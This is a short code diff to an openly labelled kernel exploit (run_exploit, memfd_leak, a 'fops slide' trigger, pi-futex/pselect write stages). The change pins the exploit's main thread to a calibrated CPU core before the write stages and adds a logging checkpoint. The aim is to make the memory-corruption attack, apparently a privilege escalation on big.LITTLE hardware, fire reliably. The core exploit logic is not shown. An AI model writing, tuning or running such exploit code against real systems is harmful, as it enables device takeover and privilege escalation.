@@ -21,7 +21,7 @@ atomic_int pipe_prepare_done;
 int memfd_leak;
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-static void durable_log_checkpoint(const char *stage) {
+void durable_log_checkpoint(const char *stage) {
   struct stat st;
   pr_info("durable log checkpoint stage=%s\n", stage);
   SYSCHK(fflush(NULL));
@@ -841,6 +841,12 @@ int run_exploit(int argc, char **argv) {
   }
 #else
   start_p0_ref_keeper();
+  /* pinning-test hybrid: kernelsnitch scan + controlled-mm reclaim are
+   * P-core tolerant (e2e-verified), but the pi-futex/pselect write
+   * choreography is calibrated to the LITTLE pair. Hand the main thread
+   * back to the calibrated literal for the write stages. */
+  pin_to_core(RMG_CORE_LITERAL);
+  durable_log_checkpoint("fops-pre-pin-little");
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
